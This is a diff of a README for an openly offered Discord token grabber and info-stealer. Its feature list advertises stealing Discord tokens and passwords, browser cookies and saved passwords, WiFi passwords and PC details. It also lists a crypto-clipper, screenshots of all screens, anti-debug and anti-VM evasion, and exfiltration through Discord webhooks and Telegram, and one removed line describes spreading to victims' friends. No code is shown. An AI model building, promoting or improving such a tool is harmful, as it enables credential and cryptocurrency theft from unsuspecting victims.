@@ -3,21 +3,22 @@
  Our Discord Server: [discord.gg/XMSbWFAXn3](https://discord.gg/XMSbWFAXn3)
 ### 🐵 Features
    - [x] Protection (AntiDebug, AntiEmulation, AntiWebSniffers, AntiVM, AntiSandboxie) which is controlled through the settings file.
-   - [x] Gateway support, you can create your execution with the built-in library that I made; (There is a block of code after the grabbing which you can add your things to do, I added as an example Spread which is controlled through the settings file).
-   - [x] Spread to the victim's friends after grabbing. 
-   - [x] Discord webhooks integration. 
+   - [x] Discord webhooks & Telegram integration. 
    - [x] Grabs tokens from all installed clients even if the main path changed and deletes accounts duplicates.
-   - [x] 18 hardcoded known tokens locations.
+   - [x] 18 hardcoded known tokens locations :(.
    - [x] Grabs PC information + token information (IP, CPU, GPU, WINKEY).
-   - [x] Sends screenshot of all screens at the moment of the grabbing.
+   - [x] Grabs Discord password and sending the new info with every event that involves password. 
+   - [x] Sends screenshot of all screens at the moment of the grabbing (all screens).
    - [x] Grabs browser cookies and passwords.
-   - [x] Supports Brave, Chrome, Edge, Firefox, and OperaGx. [Password & Cookies stealer]
+   - [x] Supports Brave, Chrome, Firefox, and OperaGx. [Password & Cookies stealer]
+   - [x] WIFI passwords stealer. 
+   - [x] Crypto-clipper.
+   - [x] Feature to steal most of based Gecko & Chromium browsers.
    - [x] Self-updating, When a new account is logged or password changed will be sent again with the new information.
    - [x] Bypasses Anti-Token-Grabbers.
    - [x] Supports grabbing from Firefox-based browsers (Pale Moon, WaterFox, Firefox [I will add more in the future]) <br><br>
    - [ ]  Local cache.
    - [ ]  18 hardcoded paths 😕 (Because I prefer dynamic).
-   - [ ]  Works pretty slow (18 seconds on average) because it was taking lots of CPU usage, now it's pretty silent and should work at the same time for all CPUs.
  
 ### 📣 Some notes
 **AFTER THE BUILD U _CAN_ DELETE EVERYTHING IN THE OUTPUT DIRECTORY EXCEPT THE EXE FILE!**<br>
